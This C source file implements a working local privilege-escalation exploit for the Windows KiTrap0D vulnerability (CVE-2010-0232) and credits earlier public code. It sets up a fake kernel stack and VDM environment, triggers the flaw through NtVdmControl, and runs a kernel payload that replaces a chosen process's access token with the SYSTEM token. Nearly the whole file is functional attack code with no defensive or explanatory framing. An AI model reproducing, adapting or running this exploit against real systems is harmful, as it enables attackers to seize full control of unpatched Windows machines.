// A port of HDM's/Pusscat's implementation of Tavis Ormandy's code (vdmexploit.c).
// http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html

#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS
#endif
#include "elevator.h"
#include "kitrap0d.h"
#include <winerror.h>
#include <winternl.h>
#include <stddef.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>

#ifdef _WIN64

/*
 * This is not implemented for the x64 build.
 */
VOID elevator_kitrap0d( DWORD dwProcessId, DWORD dwKernelBase, DWORD dwOffset )
{
	return;
}

#else

/*
 * The global variables used...
 */
static DWORD dwTargetProcessId      = 0;
static DWORD * lpKernelStackPointer = NULL;
static HMODULE hKernel              = NULL;

/*
 * Find an exported kernel symbol by name.
 */
PVOID elevator_kitrap0d_kernelgetproc( PSTR SymbolName )
{
	PUCHAR ImageBase                        = NULL;
	PULONG NameTable                        = NULL;
	PULONG FunctionTable                    = NULL;
	PUSHORT OrdinalTable                    = NULL;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
	PIMAGE_DOS_HEADER DosHeader             = NULL;
	PIMAGE_NT_HEADERS PeHeader              = NULL;
	DWORD i                                 = 0;

	ImageBase       = (PUCHAR)hKernel;
	DosHeader       = (PIMAGE_DOS_HEADER)ImageBase;
	PeHeader        = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
	ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + PeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Find required tables from the ExportDirectory...
	NameTable       = (PULONG)(ImageBase + ExportDirectory->AddressOfNames);
	FunctionTable   = (PULONG)(ImageBase + ExportDirectory->AddressOfFunctions);
	OrdinalTable    = (PUSHORT)(ImageBase + ExportDirectory->AddressOfNameOrdinals);

	// Scan each entry for a matching name.
	for( i=0 ; i < ExportDirectory->NumberOfNames ; i++ )
	{
		PCHAR Symbol = ImageBase + NameTable[i];

		if( strcmp( Symbol, SymbolName ) == 0 )
		{
			// Symbol found, return the appropriate entry from FunctionTable.
			return (PVOID)( ImageBase + FunctionTable[OrdinalTable[i]] );
		}
	}

	// Symbol not found, this is likely fatal :-(
	return NULL;
}

/*
 * Replace a value if it falls between a given range.
 */
BOOL elevator_kitrap0d_checkandreplace( PDWORD checkMe, DWORD rangeStart, DWORD rangeEnd, DWORD value )
{
	if( *checkMe >= rangeStart && *checkMe <= rangeEnd )
	{
		*checkMe = value;
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

/*
 * Search the specified data structure for a member with CurrentValue.
 */
BOOL elevator_kitrap0d_findandreplace( PDWORD Structure, DWORD CurrentValue, DWORD NewValue, DWORD MaxSize, BOOL ObjectRefs)
{
	DWORD i    = 0;
	DWORD Mask = 0;

	// Microsoft QWORD aligns object pointers, then uses the lower three
	// bits for quick reference counting (nice trick).
	Mask = ObjectRefs ? ~7 : ~0;

	// Mask out the reference count.
	CurrentValue &= Mask;

	// Scan the structure for any occurrence of CurrentValue.
	for( i = 0 ; i < MaxSize ; i++ )
	{
		if( (Structure[i] & Mask) == CurrentValue )
		{
			// And finally, replace it with NewValue.
			Structure[i] = NewValue;
			return TRUE;
		}
	}

	// Member not found.
	return FALSE;
}

/*
 * This routine is where we land after successfully triggering the vulnerability.
 */
#pragma warning(disable: 4731)
VOID elevator_kitrap0d_firststage( VOID )
{
	FARPROC DbgPrint                     = NULL;
	FARPROC PsGetCurrentThread           = NULL;
	FARPROC PsGetCurrentThreadStackBase  = NULL;
	FARPROC PsGetCurrentThreadStackLimit = NULL;
	FARPROC PsLookupProcessByProcessId   = NULL;
	FARPROC PsReferencePrimaryToken      = NULL;
	FARPROC ZwTerminateProcess           = NULL;
	PVOID CurrentThread                  = NULL;
	PVOID TargetProcess                  = NULL;
	PVOID * PsInitialSystemProcess       = NULL;
	HANDLE pret                          = NULL;
	DWORD StackBase                      = 0;
	DWORD StackLimit                     = 0;
	DWORD NewStack                       = 0;
	DWORD i                              = 0;
	DWORD dwEThreadOffsets[]             = {
												0x6, // WinXP SP3, VistaSP2
												0xA	 // Windows 7, VistaSP1
											};

	// Keep interrupts off until we've repaired the KTHREAD.
	__asm cli

	// Resolve some routines we need from the kernel export directory
	DbgPrint                     = elevator_kitrap0d_kernelgetproc( "DbgPrint" );
	PsGetCurrentThread           = elevator_kitrap0d_kernelgetproc( "PsGetCurrentThread" );
	PsGetCurrentThreadStackBase  = elevator_kitrap0d_kernelgetproc( "PsGetCurrentThreadStackBase" );
	PsGetCurrentThreadStackLimit = elevator_kitrap0d_kernelgetproc( "PsGetCurrentThreadStackLimit" );
	PsInitialSystemProcess       = elevator_kitrap0d_kernelgetproc( "PsInitialSystemProcess" );
	PsLookupProcessByProcessId   = elevator_kitrap0d_kernelgetproc( "PsLookupProcessByProcessId" );
	PsReferencePrimaryToken      = elevator_kitrap0d_kernelgetproc( "PsReferencePrimaryToken" );
	ZwTerminateProcess           = elevator_kitrap0d_kernelgetproc( "ZwTerminateProcess" );

	CurrentThread                = (PVOID)PsGetCurrentThread();
	StackLimit                   = (DWORD)PsGetCurrentThreadStackLimit();
	StackBase                    = (DWORD)PsGetCurrentThreadStackBase();

	NewStack = StackBase - ( (StackBase - StackLimit) / 2 );

	// First we need to repair the CurrentThread, find all references to the fake kernel
	// stack and repair them. Note that by "repair" we mean randomly point them
	// somewhere inside the real stack.

	// Walk only the offsets that could possibly be bad based on testing, and see if they need
	// to be swapped out.  O(n^2) -> O(c) wins the race!
	for( i=0 ; i < sizeof(dwEThreadOffsets) / sizeof (DWORD) ; i++ )
		elevator_kitrap0d_checkandreplace( (((PDWORD) CurrentThread)+dwEThreadOffsets[i]), (DWORD)&lpKernelStackPointer[0], (DWORD)&lpKernelStackPointer[KSTACKSIZE - 1], (DWORD)NewStack );
	
	// Find the EPROCESS structure for the process we want to escalate
	if( PsLookupProcessByProcessId( dwTargetProcessId, &TargetProcess ) == STATUS_SUCCESS )
	{
		PACCESS_TOKEN SystemToken = NULL;
		PACCESS_TOKEN TargetToken = NULL;

		// What's the maximum size the EPROCESS structure is ever likely to be?
		CONST DWORD MaxExpectedEprocessSize = 0x200;

		// DbgPrint("PsLookupProcessByProcessId(%u) => %p\n", TargetPid, TargetProcess);
		//DbgPrint("PsInitialSystemProcess @%p\n", *PsInitialSystemProcess);

		// Find the Token object for my target process, and the SYSTEM process.
		TargetToken = (PACCESS_TOKEN)PsReferencePrimaryToken( TargetProcess );

		SystemToken = (PACCESS_TOKEN)PsReferencePrimaryToken( *PsInitialSystemProcess );

		//DbgPrint("PsReferencePrimaryToken(%p) => %p\n", TargetProcess, TargetToken);
		//DbgPrint("PsReferencePrimaryToken(%p) => %p\n", *PsInitialSystemProcess, SystemToken);

		// Find the token in the target process, and replace with the system token.
		elevator_kitrap0d_findandreplace( (PDWORD)TargetProcess, (DWORD)TargetToken, (DWORD)SystemToken, MaxExpectedEprocessSize, TRUE );
		
		// Success
		pret = (HANDLE)'w00t';
	}
	else
	{
		// Maybe the user closed the window?
		// Report this failure
		pret = (HANDLE)'LPID';
	}

	__asm
	{
		mov eax, -1   // ZwCurrentProcess macro returns -1
		mov ebx, NewStack
		mov ecx, pret
		mov edi, ZwTerminateProcess
		mov esp, ebx  // Swap the stack back to kernel-land
		mov ebp, ebx  // Swap the frame pointer back to kernel-land
		sub esp, 256
		push ecx      // Push the return code
		push eax      // Push the process handle
		sti           // Restore interrupts finally
		call edi      // Call ZwTerminateProcess
		__emit 0xCC;  // Hope we never end up here
	};

}
#pragma warning(default: 4731)

/*
 * Setup a minimal execution environment to satisfy NtVdmControl().
 */
BOOL elevator_kitrap0d_initvdmsubsystem( VOID )
{
	DWORD dwResult                   = ERROR_SUCCESS;
	FARPROC pNtAllocateVirtualMemory = NULL;
	FARPROC pNtFreeVirtualMemory     = NULL;
	FARPROC pNtVdmControl            = NULL;
	PBYTE BaseAddress                = (PVOID)0x00000001;
	HMODULE hNtdll                   = NULL;
	ULONG RegionSize                 = 0;
	static DWORD TrapHandler[128]    = {0};
	static DWORD IcaUserData[128]    = {0};

	static struct {
		PVOID TrapHandler;
		PVOID IcaUserData;
	} InitData;

	do
	{
		hNtdll = GetModuleHandle( "ntdll" );
		if( !hNtdll )
			BREAK_WITH_ERROR( "[ELEVATOR-KITRAP0D] elevator_kitrap0d_initvdmsubsystem. GetModuleHandle ntdll failed", ERROR_INVALID_PARAMETER );

		pNtAllocateVirtualMemory = GetProcAddress( hNtdll, "NtAllocateVirtualMemory" );
		pNtFreeVirtualMemory     = GetProcAddress( hNtdll, "NtFreeVirtualMemory" );
		pNtVdmControl            = GetProcAddress( hNtdll, "NtVdmControl" );

		if( !pNtAllocateVirtualMemory || !pNtFreeVirtualMemory || !pNtVdmControl )
			BREAK_WITH_ERROR( "[ELEVATOR-KITRAP0D] elevator_kitrap0d_initvdmsubsystem. invalid params", ERROR_INVALID_PARAMETER );
		
		InitData.TrapHandler = TrapHandler;
		InitData.IcaUserData = IcaUserData;

		// Remove anything currently mapped at NULL
		pNtFreeVirtualMemory( GetCurrentProcess(), &BaseAddress, &RegionSize, MEM_RELEASE );

		BaseAddress = (PVOID)0x00000001;
		RegionSize  = (ULONG)0x00100000;

		// Allocate the 1MB virtual 8086 address space.
		if( pNtAllocateVirtualMemory( GetCurrentProcess(), &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) != STATUS_SUCCESS )
			BREAK_WITH_ERROR( "[ELEVATOR-KITRAP0D] elevator_kitrap0d_initvdmsubsystem. NtAllocateVirtualMemory failed", 'NTAV' );

		// Finalise the initialisation.
		if( pNtVdmControl( VdmInitialize, &InitData ) != STATUS_SUCCESS )
			BREAK_WITH_ERROR( "[ELEVATOR-KITRAP0D] elevator_kitrap0d_initvdmsubsystem. NtVdmControl failed", 'VDMC' );

		return TRUE;

	} while( 0 );

	ExitThread( dwResult );

	return FALSE;
}

/*
 * (CVE-2010-0232)
 */
VOID elevator_kitrap0d( DWORD dwProcessId, DWORD dwKernelBase, DWORD dwOffset )
{
	DWORD dwResult                    = ERROR_SUCCESS;
	FARPROC pNtVdmControl             = NULL;
	HMODULE hNtdll                    = NULL;
	DWORD dwKernelStack[KSTACKSIZE]   = {0};
	VDMTIB VdmTib                     = {0};
	DWORD dwMinimumExpectedVdmTibSize = 0x200;
	DWORD dwMaximumExpectedVdmTibSize = 0x800;
	
	do
	{
		dprintf( "[ELEVATOR-KITRAP0D] elevator_kitrap0d. dwProcessId=%d, dwKernelBase=0x%08X, dwOffset=0x%08X", dwProcessId, dwKernelBase, dwOffset );
		
		memset( &VdmTib, 0, sizeof( VDMTIB ) );
		memset( &dwKernelStack, 0, KSTACKSIZE * sizeof( DWORD ) );
	
		// XXX: Windows 2000 forces the thread to exit with 0x80 if Padding3 is filled with junk.
		//      With a buffer full of NULLs, the exploit never finds the right size.
		//      This will require a more work to resolve, for just keep the padding zero'd

		hNtdll = GetModuleHandle( "ntdll" );
		if( !hNtdll )
			BREAK_WITH_ERROR( "[ELEVATOR-KITRAP0D] elevator_kitrap0d. GetModuleHandle ntdll failed", ERROR_INVALID_PARAMETER );

		pNtVdmControl = GetProcAddress( hNtdll, "NtVdmControl" );
		if( !pNtVdmControl )
			BREAK_ON_ERROR( "[ELEVATOR-KITRAP0D] elevator_kitrap0d. GetProcAddress NtVdmControl failed" );

		dwTargetProcessId = dwProcessId;

		// Setup the fake kernel stack, and install a minimal VDM_TIB...
		lpKernelStackPointer        = (DWORD *)&dwKernelStack;
		dwKernelStack[0]            = (DWORD)&dwKernelStack[8];            // ESP
		dwKernelStack[1]            = (DWORD)NtCurrentTeb();               // TEB
		dwKernelStack[2]            = (DWORD)NtCurrentTeb();               // TEB
		dwKernelStack[7]            = (DWORD)elevator_kitrap0d_firststage; // RETURN ADDRESS
		hKernel                     = (HMODULE)dwKernelBase;
		VdmTib.Size                 = dwMinimumExpectedVdmTibSize;
		*NtCurrentTeb()->Reserved4  = &VdmTib;
	
		// Initialize the VDM Subsystem...
		elevator_kitrap0d_initvdmsubsystem();

		VdmTib.Size                 = dwMinimumExpectedVdmTibSize;
		VdmTib.VdmContext.SegCs     = 0x0B;
		VdmTib.VdmContext.Esi       = (DWORD)&dwKernelStack;
		VdmTib.VdmContext.Eip       = dwKernelBase + dwOffset;
		VdmTib.VdmContext.EFlags    = EFLAGS_TF_MASK;
		*NtCurrentTeb()->Reserved4  = &VdmTib;

		// Allow thread initialization to complete. Without is, there is a chance
		// of a race in KiThreadInitialize's call to SwapContext
		Sleep( 1000 );

		// Trigger the vulnerable code via NtVdmControl()...
		while( VdmTib.Size++ < dwMaximumExpectedVdmTibSize )
			pNtVdmControl( VdmStartExecution, NULL );

	} while( 0 );

	// Unable to find correct VdmTib size.
	ExitThread('VTIB');
}

#endif
